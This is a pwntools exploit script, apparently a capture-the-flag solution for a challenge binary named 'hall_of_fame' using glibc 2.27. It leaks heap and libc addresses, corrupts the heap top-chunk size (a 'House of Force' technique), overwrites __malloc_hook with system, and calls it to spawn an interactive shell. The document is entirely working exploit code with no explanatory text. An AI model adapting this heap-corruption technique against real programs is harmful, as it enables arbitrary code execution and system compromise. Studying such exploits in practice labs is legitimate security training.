from pwn import *

libc = ELF('./libc-2.27.so')

gs = '''
    continue
'''
io = process('./hall_of_fame',env={'LD_PRELOAD':'./libc-2.27.so'})

def add(size, data):
    io.sendline('1')  
    io.recvuntil('score? > ')
    io.sendline(f'{size}')
    io.sendline(data)
  
if args.GDB:
    gdb.attach(io, gdbscript=gs)        

io.sendline(b'2')
io.recvuntil('is at ')
heap = int(io.recvline().strip(),16)
io.recvuntil(b'is at ')
libc.address = int(io.recvline().strip(),16) - libc.sym.puts

log.success(f'head base @ 0x{heap:02x}')
log.success(f'libc base found at @ 0x{libc.address:02x}')

# overwrite the wildrness with large value

add(24,b'A'*24+p64(0xffffffffffffffff))

# overwrite __malloc_hook

top_chunk = heap+0x270

size = libc.sym.__malloc_hook-0x20-top_chunk

add(size,b'/bin/sh\x00')

add(24,p64(libc.sym.system))

#sh  = next(libc.search(b'/bin/sh\x00'))
sh = heap+0x280

add(sh,b'')

io.interactive()
